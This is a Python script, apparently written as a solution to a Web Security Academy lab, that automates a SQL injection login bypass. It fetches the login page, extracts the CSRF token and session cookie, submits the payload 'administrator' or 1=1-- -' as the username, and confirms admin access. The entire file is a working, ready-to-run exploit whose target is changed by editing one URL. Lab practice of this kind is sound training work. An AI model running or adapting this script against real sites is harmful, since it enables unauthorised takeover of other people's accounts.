####################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 13/9/2023
#
# Lab: SQL injection vulnerability allowing login bypass
#
# Steps: 1. Fetch the login page
#        2. Extract the csrf token and session cookie
#        3. Inject the payload and bypass password check
#        4. Login in as administrator
#
#####################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########
# change this url to your lab
url = "https://0a0800af0454152d82c7898400c400bd.web-security-academy.net"

try:  # fetch login page
    fetch_login = requests.get(f"{url}/login")
    if fetch_login.status_code == 200:
        print(Fore.WHITE + "1. Fetching login page.. " + Fore.GREEN + "OK")
        # extract session cookie
        session = fetch_login.cookies.get("session")
        # extract csrf token
        csrf = re.findall("csrf.+value=\"(.+)\"",
                          fetch_login.content.decode())[0]
        print(Fore.WHITE + "2. Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
        try:
            # the payload to inject
            payload = "administrator' or 1=1-- -"
            data = {
                "username": payload,
                "password": "not important",
                "csrf": csrf
            }
            cookies = {
                "session": session
            }
            # login in with the injected payload
            login_inject = requests.post(f"{url}/login", data,
                                         cookies=cookies, allow_redirects=False)
            if login_inject.status_code == 302:
                print(
                    Fore.WHITE + "3. Injecting payload and bypassing password check.. " + Fore.GREEN + "OK")
                # extract new session
                new_session = login_inject.cookies.get("session")
                cookies = {
                    "session": new_session
                }
                try:  # fetch admin home page
                    admin = requests.get(f"{url}/my-account", cookies=cookies)
                    if admin.status_code == 200:
                        print(
                            Fore.WHITE + "4. Logging in as administrator.. " + Fore.GREEN + "OK")
                        print(
                            Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
                    else:
                        print(Fore.RED + "[!] Failed to fetch admin home")
                except:
                    print(
                        Fore.RED + "[!] Failed to fetch admin home through exception")
            else:
                print(Fore.RED + "[!] Failed to inject the payload")
        except:
            print(
                Fore.RED + "[!] Failed to inject the payload through exception")
    else:
        print(Fore.RED + "[!] Failed to fetch login page")
except:
    print(Fore.RED + "[!] Failed to fetch login page through exception")
